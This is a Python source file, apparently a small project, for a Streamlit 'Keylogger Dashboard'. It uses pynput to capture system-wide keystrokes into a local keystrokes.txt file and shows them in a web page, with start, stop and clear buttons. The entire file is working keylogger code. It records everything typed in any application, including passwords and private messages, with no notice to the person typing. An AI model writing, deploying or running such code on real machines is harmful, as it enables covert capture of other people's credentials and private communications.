import streamlit as st
import threading
import time
from pynput.keyboard import Listener
Log_File = "keystrokes.txt"
logging = False
pressed_keys = set()
def on_press(key):
    global pressed_keys
    key_str = str(key).replace("'","")
    if key_str == "Key.space":
        key_str=" "
    elif "Key" in key_str:
        return
    
    if key_str in pressed_keys:
        return
    pressed_keys.add(key_str)

    with open(Log_File,"a") as file:
        file.write(key_str + " ")

def on_release(key):
    key_str=str(key).replace("'","")
    if key_str in pressed_keys:
        pressed_keys.remove(key_str)

def start_keylogger():
    global logging
    logging = True
    listener = Listener(on_press=on_press, on_release=on_release)
    listener.start()
    while logging:
        time.sleep(0.1)
    listener.stop()

def stop_keylogger():
    global logging
    logging = False

st.title("Keylogger Dashboard")

if st.button("Start Keylogger"):
    if not logging:
        threading.Thread(target =start_keylogger,daemon=True).start()
        st.success("keylogger started!")

if st.button("Stop Keylogger"):
    stop_keylogger()
    st.warning("Keylogger Stopped!")

st.subheader("Logged Keystrokes:")

status_text = st.empty()
if logging:
    status_text.markdown("keylogger is running")
else:
    status_text.markdown("keylogger is stopped")


try:
    with open(Log_File,"r") as file:
        logs = file.read()
    st.text_area("Keystroke Logs",logs,height=200)

except FileNotFoundError:
    st.write("No logs found")

if st.button("Clear Logs"):
    open(Log_File,"w").close()
    st.rerun()